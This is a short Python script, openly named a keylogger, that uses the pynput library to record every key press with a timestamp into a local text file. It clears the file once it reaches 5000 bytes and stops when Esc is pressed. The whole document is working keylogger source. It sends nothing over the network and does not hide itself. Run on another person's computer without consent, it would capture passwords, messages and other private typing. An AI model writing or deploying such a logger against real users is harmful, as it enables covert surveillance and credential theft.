from pynput.keyboard import Listener, Key
from datetime import datetime
import os

log_file = "keylogger_log.txt"

max_size = 5000  # Maximum file size in bytes

def log_key(key):
    # Stop the program if the "Echap" key is pressed
    if key == Key.esc:
        print("Keylogger stopped by the user.")
        return False  

    if os.path.exists(log_file) and os.path.getsize(log_file) >= max_size:
        with open(log_file, "w") as file:
            file.write("=== New log file ===\n")

    with open(log_file, "a") as file:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        try:
            file.write(f"{timestamp} - {key.char}\n") 
        except AttributeError:
            file.write(f"{timestamp} - [{key}]\n")     # Logs special keys

with Listener(on_press=log_key) as listener:
    listener.join()
